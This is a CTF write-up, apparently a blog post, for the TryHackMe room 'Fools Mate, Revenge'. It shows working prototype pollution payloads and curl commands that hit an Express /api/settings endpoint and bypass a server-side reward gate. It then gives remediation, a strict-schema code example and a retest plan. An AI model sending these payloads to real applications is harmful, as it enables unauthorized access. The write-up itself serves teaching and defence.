---
title: "TryHackMe: Fools Mate, Revenge"
date: 2026-07-04 23:35:00 +0200
categories: [TryHackMe]
tags:
  - web
  - nodejs
  - express
  - prototype-pollution
  - business-logic
  - api
description: >-
  Fools Mate, Revenge hardened the original chess challenge with a server-side
  reward gate, but unsafe object handling in /api/settings allowed prototype
  pollution to flip the authorization state and release the flag.
author: lenovolegion7
media_subpath: /images/tryhackme_fools_mate_revenge
image:
  path: room_image.webp
  alt: "Original TryHackMe Fools Mate Revenge room artwork"
toc: true
comments: false
---

Fools Mate, Revenge improves on the original challenge by moving the reward decision behind a server-side gate. A direct checkmate is accepted, but the application withholds the reward unless an internal `session.config.unlocked` state is set. The new weakness is deeper: unsafe object handling in `/api/settings` allows crafted JSON to influence that state and bypass the reward gate.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe Fools Mate Revenge room card](room_card.webp){: w="305" h="272" .shadow }](https://tryhackme.com/room/foolsm8v2){: .center }

## Initial Enumeration

Service discovery identified SSH and a Node.js Express application:

```console
$ nmap -Pn -sC -sV -T4 TARGET_IP
22/tcp   open  ssh   OpenSSH 9.6p1 Ubuntu
3000/tcp open  http  Node.js Express
```

The web application presented the same chess endgame theme as the original Fools Mate room. Client-side source review exposed the starting FEN and the API routes used by the browser:

```javascript
const START_FEN = '6k1/5ppp/8/8/8/8/5PPP/R5K1 w - - 0 1';

fetch('/api/move', { method: 'POST' });
fetch('/api/reset', { method: 'POST' });
fetch('/api/settings', { method: 'POST' });
fetch('/api/state');
```

The legal mate-in-one remained:

```text
a1 -> a8
```

## Reward Gate Behavior

Submitting the winning move before exploitation produced a valid checkmate but no flag:

```json
{
  "ok": true,
  "move": "a1a8",
  "status": "checkmate",
  "winner": "white",
  "locked": true,
  "message": "Checkmate! No reward for you.",
  "reason": "reward gate closed: session.config.unlocked is not set"
}
```

This response revealed two important facts:

1. the backend now validates the chess move correctly; and
2. reward release depends on mutable state at `session.config.unlocked`.

That made the `/api/settings` workflow the next logical target.

## Confirmed API Surface

| Endpoint | Method | Purpose |
|---|---|---|
| `/api/state` | GET | Returns current session chess state |
| `/api/reset` | POST | Resets the board |
| `/api/move` | POST | Submits a move |
| `/api/settings` | POST | Saves UI preferences |

The preferences endpoint appeared to accept harmless values such as `theme`, `pieceSet`, and `animationMs`, but crafted nested object keys affected server-side state outside the intended preference schema.

## Validated Attack Path

1. **Enumerate the Express application** and identify the chess API routes.
2. **Create a session** with `/api/state`.
3. **Reset the board** to the original FEN.
4. **Confirm the reward gate is closed** by submitting `a1 -> a8`.
5. **Send crafted JSON to `/api/settings`** using a `constructor.prototype` path.
6. **Set `unlocked` to `true`** through unsafe object assignment / prototype pollution.
7. **Reset the game state** again.
8. **Submit the legitimate mate-in-one** move.
9. **Receive the protected flag** from the server response.

> **Result:** Unsafe object handling in `/api/settings` allowed an unauthenticated client to manipulate the state used by the server-side reward gate.
{: .prompt-danger }

## Prototype Pollution Payload

The successful payload used a nested `constructor.prototype` object:

```json
{
  "constructor": {
    "prototype": {
      "unlocked": true
    }
  },
  "theme": "forest",
  "pieceSet": "classic",
  "animationMs": 0
}
```

The report also validated related object paths such as:

```json
{"prototype":{"unlocked":true}}
```

and:

```json
{"config.unlocked":true}
```

The key issue is not the chess move itself. The vulnerability exists because arbitrary request-body properties are merged or assigned into an application object without a strict schema and without rejecting dangerous object paths.

## Exploitation Sequence

Create and preserve a session:

```console
$ curl -s -c cookies.txt http://TARGET_IP:3000/api/state > /dev/null
```

Reset the board:

```console
$ curl -s -b cookies.txt -c cookies.txt \
  -X POST http://TARGET_IP:3000/api/reset > /dev/null
```

Send the pollution payload:

```console
$ curl -s -b cookies.txt -c cookies.txt \
  -X POST http://TARGET_IP:3000/api/settings \
  -H 'Content-Type: application/json' \
  -d '{"constructor":{"prototype":{"unlocked":true}},"theme":"forest","pieceSet":"classic","animationMs":0}'
```

Reset once more, then submit the winning move:

```console
$ curl -s -b cookies.txt -c cookies.txt \
  -X POST http://TARGET_IP:3000/api/reset > /dev/null

$ curl -s -b cookies.txt -c cookies.txt \
  -X POST http://TARGET_IP:3000/api/move \
  -H 'Content-Type: application/json' \
  -d '{"from":"a1","to":"a8"}'
```

The server now returned the reward:

```json
{
  "ok": true,
  "move": "a1a8",
  "status": "checkmate",
  "winner": "white",
  "flag": "THM{[REDACTED]}"
}
```

## Findings

### FM-001 — Prototype Pollution via `/api/settings`

- **Severity:** Critical
- **Affected component:** `POST /api/settings`
- **Impact:** Reward-gate bypass and protected-data disclosure

The endpoint accepted attacker-controlled object structure beyond the expected preference keys. Dangerous properties such as `constructor` and `prototype` influenced state later trusted by the reward logic.

**Remediation:**

- apply strict schema validation;
- reject `__proto__`, `prototype`, `constructor`, and equivalent nested or dot-notation paths;
- avoid recursively merging arbitrary request bodies;
- map approved request fields explicitly into a new object;
- add prototype-pollution regression tests.

### FM-002 — Authorization Depends on Mutable Session/Config State

- **Severity:** High
- **Affected component:** Reward authorization logic
- **Impact:** Business-logic bypass when mutable configuration state is modified

The server treated `session.config.unlocked` as an authorization decision even though the underlying object could be influenced through user-controlled settings.

**Remediation:**

- keep authorization state separate from user preferences;
- use server-controlled state transitions;
- require an explicit validated condition before setting reward entitlement;
- use own-property and strict-type checks for security-sensitive booleans.

### FM-003 — Verbose Error Discloses Internal Gate Variable

- **Severity:** Low
- **Affected component:** `POST /api/move`
- **Impact:** Accelerates exploitation by revealing the internal authorization path

The pre-exploitation response explicitly disclosed:

```text
session.config.unlocked
```

That implementation detail pointed directly toward the state that needed to be manipulated.

**Remediation:**

- return generic client-facing errors;
- keep implementation details in server-side logs;
- do not expose internal object paths or authorization variables in production responses.

## Safer Validation Pattern

A strict request schema prevents arbitrary object keys from reaching application state. For example:

```javascript
const schema = z.object({
  theme: z.enum(['forest', 'midnight', 'coral']),
  pieceSet: z.enum(['classic', 'outline']),
  animationMs: z.union([
    z.literal(0),
    z.literal(100),
    z.literal(180)
  ])
}).strict();

const prefs = schema.parse(req.body);

req.session.preferences = {
  theme: prefs.theme,
  pieceSet: prefs.pieceSet,
  animationMs: prefs.animationMs
};
```

The reward decision should then live in separate server-controlled state that cannot be updated through the preference endpoint.

## Retest Plan

1. Submit `constructor.prototype.unlocked` through `/api/settings` and verify it is rejected.
2. Repeat with `prototype.unlocked`, `__proto__`, and dot-notation variants.
3. Confirm only `theme`, `pieceSet`, and `animationMs` are accepted.
4. Verify a direct checkmate still solves the chess puzzle but does not release a reward without legitimate entitlement.
5. Confirm reward authorization does not read from user-controlled preference/configuration objects.
6. Confirm errors no longer expose `session.config.unlocked` or similar implementation details.

## Lessons Learned

Fools Mate, Revenge is a useful follow-up to the original challenge because the developer correctly moved the primary reward decision away from the browser, but the new server-side control still depended on mutable state influenced by untrusted input.

The broader lesson is that moving logic server-side is only part of the fix. Authorization state must also be isolated from generic configuration objects, and JSON object handling must be constrained by explicit schemas rather than permissive recursive merge behavior.
